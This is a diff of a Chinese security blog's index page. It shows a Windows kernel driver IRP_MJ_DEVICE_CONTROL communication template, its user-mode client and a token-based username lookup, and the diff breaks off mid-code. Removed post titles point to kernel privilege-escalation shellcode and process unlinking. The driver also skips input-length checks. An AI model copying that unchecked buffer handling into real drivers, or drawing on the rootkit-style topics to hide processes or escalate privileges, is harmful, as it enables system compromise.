@@ -1,289 +1,930 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="zh-Hans">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="renderer" content="webkit">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
-     <link rel="shortcut icon" href= /img/favicon.ico >
-    <title>
-        Airshelf&#39;s Blog
-    </title>
-    <meta name="description" content= 学，我拼命学 >
-    <meta name="keywords" content= airshelf,pwn,windows,security >
-    
-<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
 
-    
-<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
 
-    
-<link rel="stylesheet" href="/css/style.css">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<meta name="generator" content="Hexo 5.4.0"></head>
-<body id="bodyx">
-    <div class="hd logodiv">
-    <img src="/img/male.png" class="logopng" alt="logo">
-    <p class="logot">
-         学、我拼命学 
-         <span class="logo_2"></span>
-        <h3 class="words" style="font-weight: bold;font-family: Georgia;"> 
-            Show Me The Code 
-        </h3>
-    </p>
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.6.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta property="og:type" content="website">
+<meta property="og:title" content="Airshelf&#39;s Blog">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Airshelf&#39;s Blog">
+<meta property="og:locale">
+<meta property="article:author" content="Airshelf">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-Hans","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Airshelf's Blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Airshelf's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
 </div>
 
 
-<div class="hd">
-    <ol class="breadcrumb">
-        
-            <li><a class="ba" href="/about">关于我👀</a></li>
-        
-            <li><a class="ba" target="_blank" rel="noopener" href="https://airshelf.github.io/">访问主站🎉</a></li>
-        
-            <li><a class="ba" target="_blank" rel="noopener" href="https://github.com/airshelf">GitHub🐒</a></li>
-        
 
-            
-<script src="/libs/jquery.min.js"></script>
 
-            
-<script src="/js/search.js"></script>
 
-            
-                <form class="site-search-form">
-                    <i class="fa fa-search" id="search-logo"><input type="text" id="local-search-input" class="st-search-input" /></i>
-                </form>
-                <div id="local-search-result" class="local-search-result-cls"></div>
-            
-            <script type="text/javascript" id="local.search.active">
-                var inputArea       = document.querySelector("#local-search-input");
-                var getSearchFile = function(){
-                    var path = "/search.xml";
-                    searchFunc(path, 'local-search-input', 'local-search-result');
-                }
-                inputArea.onfocus = function(){ getSearchFile() }
 
-                var $resetButton = $("#search-form .fa-times");
-                var $resultArea = $("#local-search-result");
 
-                inputArea.oninput = function(){ $resetButton.show(); }
-                resetSearch = function(){
-                    $resultArea.html("");
-                    document.querySelector("#search-form").reset();
-                    $resetButton.hide();
-                    $(".no-result").hide();
-                }
-                inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
-                //No search result
-                $resultArea.bind("DOMNodeRemoved DOMNodeInserted", function(e) {
-                    if (!$(e.target).text()) {
-                        $(".no-result").show(100);
-                    } else {
-                        $(".no-result").hide();
-                    }
-                })
-            </script>
-
-    </ol>
-    <hr>
 </div>
-<div class="hd">
-    
-    
         
-        
-            <div class="titlex">
-                <p><span class="jing"></span><span style="color: #6d9ee7;"> 公元</span> 
-                 2021年 🕛
-                </p>
-            </div>
-            
-        
-        <a class="flink" href="/2021/07/10/DriverComunicate/">
-            <div class="list">
-                <div class="postname">
-                    代码模块 | 驱动通信-IRP_MJ_DEVICE_CONTROL
-                </div>
-                <div class="posttime">
-                    July 10th
-                </div>
-            </div>
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Airshelf</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
         </a>
-    
-        
-        
-        <a class="flink" href="/2021/07/07/findUsernameWithPid/">
-            <div class="list">
-                <div class="postname">
-                    代码模块 |  通过PID获取用户名
-                </div>
-                <div class="posttime">
-                    July 7th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2021/07/07/breaklink-more/">
-            <div class="list">
-                <div class="postname">
-                    代码模块 | 驱动摘链(进阶)
-                </div>
-                <div class="posttime">
-                    July 7th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2021/07/05/breaklinks/">
-            <div class="list">
-                <div class="postname">
-                    代码模块 | 驱动摘链
-                </div>
-                <div class="posttime">
-                    July 5th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2021/07/02/projectSelectMyParent/">
-            <div class="list">
-                <div class="postname">
-                    项目开源 | 降权工具
-                </div>
-                <div class="posttime">
-                    July 2nd
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2021/07/02/MySelectMyParent/">
-            <div class="list">
-                <div class="postname">
-                    代码模块 | 合并两个文件
-                </div>
-                <div class="posttime">
-                    July 2nd
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2021/07/02/driverStart/">
-            <div class="list">
-                <div class="postname">
-                    代码模块 | 驱动模版
-                </div>
-                <div class="posttime">
-                    July 2nd
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2021/07/01/FindPidwithName/">
-            <div class="list">
-                <div class="postname">
-                    代码模块 | 获取PID方法
-                </div>
-                <div class="posttime">
-                    July 1st
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2021/06/30/shellcode/">
-            <div class="list">
-                <div class="postname">
-                    代码模块 | 内核提权shellcode
-                </div>
-                <div class="posttime">
-                    June 30th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2021/01/25/battleye2/">
-            <div class="list">
-                <div class="postname">
-                    游戏安全 | ByttleEye 学习笔记
-                </div>
-                <div class="posttime">
-                    January 25th
-                </div>
-            </div>
-        </a>
-    
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
 </div>
 
-    <div class="footer" id="footer">
-    <p><h4>版权所有 © 2021 | 作者: Airshelf</h4>
-    
-        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
-        <span class="post-meta-divider">|</span>
-        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
-    
-    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
-        <input type="checkbox" name="switch" id="update_style">
-        <span class="el-switch-style"></span>
-    </label>
 
-    <!--         <script type="text/javascript">
-    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
-    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
-    </script> -->
-</p>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/10/DriverComunicate/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/07/10/DriverComunicate/" class="post-title-link" itemprop="url">代码模块 | 驱动通信-IRP_MJ_DEVICE_CONTROL</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-07-10 11:43:21 / Modified: 11:45:31" itemprop="dateCreated datePublished" datetime="2021-07-10T11:43:21+08:00">2021-07-10</time>
+    </span>
+
+  
 </div>
 
-<input type="hidden" id="web_style" value="black">
-<input type="hidden" id="valine_appid" value="DTEQb4XAyBxOQ5KMMeKIzaBz-gzGzoHsz">
-<input type="hidden" id="valine_appKey" value="U0jt5rQRkgRiFxfu3baNhCqv">
+        </div>
+      </header>
 
-<script src="/libs/jquery.min.js"></script>
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>普通的驱动通信模板，使用了<code>IRP_MJ_DEVICE_CONTROL</code>：</p>
+<h5 id="R0驱动代码"><a href="#R0驱动代码" class="headerlink" title="R0驱动代码"></a>R0驱动代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">L&quot;\\Device\\Airshelf&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYM_NAME <span class="meta-string">L&quot;\\??\\Airshelf&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_CTR_INDEX 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST CTL_CODE(FILE_DEVICE_UNKNOWN,CODE_CTR_INDEX,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DefaultDispatch</span><span class="params">(PDEVICE_OBJECT DeviceObject,PIRP Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Irp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	IoCompleteRequest(Irp, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MainDispatch</span><span class="params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIO_STACK_LOCATION ioStack = IoGetCurrentIrpStackLocation(Irp);</span><br><span class="line">	<span class="keyword">if</span>(ioStack-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD32 InSize = ioStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">		DWORD32 OutSize = ioStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">		ULONG IoControlCode = ioStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(IoControlCode)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> TEST:</span><br><span class="line">			&#123;</span><br><span class="line">				PDWORD32 x = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">				DWORD32 y = *x + <span class="number">100</span>;</span><br><span class="line">				KdPrintEx((<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[+]: 0x%x!!!\r\n&quot;</span>,*x));</span><br><span class="line">				<span class="built_in">memcpy</span>(Irp-&gt;AssociatedIrp.SystemBuffer, &amp;y, <span class="number">4</span>);</span><br><span class="line">				Irp-&gt;IoStatus.Information = OutSize;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">default</span>:<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Irp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	IoCompleteRequest(Irp, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DrivUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING symName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	RtlInitUnicodeString(&amp;symName, SYM_NAME);</span><br><span class="line">	IoDeleteSymbolicLink(&amp;symName);</span><br><span class="line">	IoDeleteDevice(DriverObject-&gt;DeviceObject);</span><br><span class="line">	KdPrintEx((<span class="number">77</span>,<span class="number">0</span>,<span class="string">&quot;[+]: Driver Unload !!!\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//DbgBreakPoint();</span></span><br><span class="line">	UNICODE_STRING uName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	RtlInitUnicodeString(&amp;uName, DEVICE_NAME);</span><br><span class="line">	PDEVICE_OBJECT pDevice = <span class="literal">NULL</span>;</span><br><span class="line">	NTSTATUS status = IoCreateDevice(pDriver, <span class="literal">NULL</span>, &amp;uName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDevice);</span><br><span class="line">	<span class="keyword">if</span>(!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrintEx((<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[x]:IoCreateDevice Fail %x!!!\r\n&quot;</span>,status));</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	UNICODE_STRING symName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	RtlInitUnicodeString(&amp;symName, SYM_NAME);</span><br><span class="line"></span><br><span class="line">	status = IoCreateSymbolicLink(&amp;symName, &amp;uName);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrintEx((<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[x]:IoCreateSymbolicLink Fail %x!!!\r\n&quot;</span>, status));</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pDevice-&gt;Flags &amp;= ~DO_DEVICE_INITIALIZING;</span><br><span class="line">	pDevice-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = DefaultDispatch;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MainDispatch;</span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DrivUnload;</span><br><span class="line">	KdPrintEx((<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[+]: Driver Loaded !!!\r\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="R3层用户代码"><a href="#R3层用户代码" class="headerlink" title="R3层用户代码"></a>R3层用户代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYM_NAME <span class="meta-string">L&quot;\\\\.\\Airshelf&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_CTR_INDEX 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST CTL_CODE(FILE_DEVICE_UNKNOWN,CODE_CTR_INDEX,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = CreateFile(SYM_NAME, GENERIC_READ | GENERIC_WRITE, FILE_READ_ACCESS | FILE_WRITE_ACCESS, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    DWORD inputValue = <span class="number">100</span>,p = <span class="number">0</span>, retValue = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;inputValue);</span><br><span class="line">    DeviceIoControl(hDevice, TEST, &amp;inputValue, <span class="number">4</span>, &amp;retValue, <span class="number">4</span>, &amp;p, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hDevice);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, retValue);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通信效果：<br><img src="/2021/07/10/DriverComunicate/image.png" alt="image.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
 
-<script src="/libs/highlight/highlight.pack.js"></script>
 
-<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
 
-<script src="/js/js.js"></script>
+    
 
-<style type="text/css">
-.v * {
-color: #698fca;
-}
-.v .vlist .vcard .vhead .vsys {
-color: #3a3e4a;
-}
-.v .vlist .vcard .vh .vmeta .vat {
-color: #638fd5;
-}
-.v .vlist .vcard .vhead .vnick {
-color: #6ba1ff;
-}
-.v a {
-color: #8696b1;
-}
-.v .vlist .vcard .vhead .vnick:hover {
-color: #669bfc;
-}
-</style>
-    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/07/findUsernameWithPid/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/07/07/findUsernameWithPid/" class="post-title-link" itemprop="url">代码模块 |  通过PID获取用户名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-07-07 13:31:17 / Modified: 13:34:23" itemprop="dateCreated datePublished" datetime="2021-07-07T13:31:17+08:00">2021-07-07</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetUserNameFromPID</span><span class="params">(DWORD PID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID);</span><br><span class="line">	<span class="keyword">if</span> (!hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;[!]OpenProcess %d Failed\r\n&quot;</span>, PID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;GetUserNameFromProc %x: start\r\n&quot;,hProcess);</span></span><br><span class="line">	<span class="keyword">if</span> (!OpenProcessToken(hProcess, TOKEN_QUERY, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;GetUserNameFromProc OpenProcessToken failed : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TOKEN_ELEVATION tokenEle;</span><br><span class="line">	DWORD dwRetLen = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!GetTokenInformation(hToken, TokenUser, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwRetLen))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (GetLastError() == ERROR_INSUFFICIENT_BUFFER &amp;&amp; dwRetLen != <span class="number">0</span>) &#123;</span><br><span class="line">			wprintf(<span class="string">L&quot;First GetTokenInformation dwRetLen %d\r\n&quot;</span>, dwRetLen);</span><br><span class="line">			PTOKEN_USER pToken = (PTOKEN_USER)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TOKEN_USER) * dwRetLen);</span><br><span class="line">			<span class="keyword">if</span> (GetTokenInformation(hToken, TokenUser, pToken, dwRetLen, &amp;dwRetLen))</span><br><span class="line">			&#123;</span><br><span class="line">				WCHAR szUserName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">				DWORD dwUserNameSize = 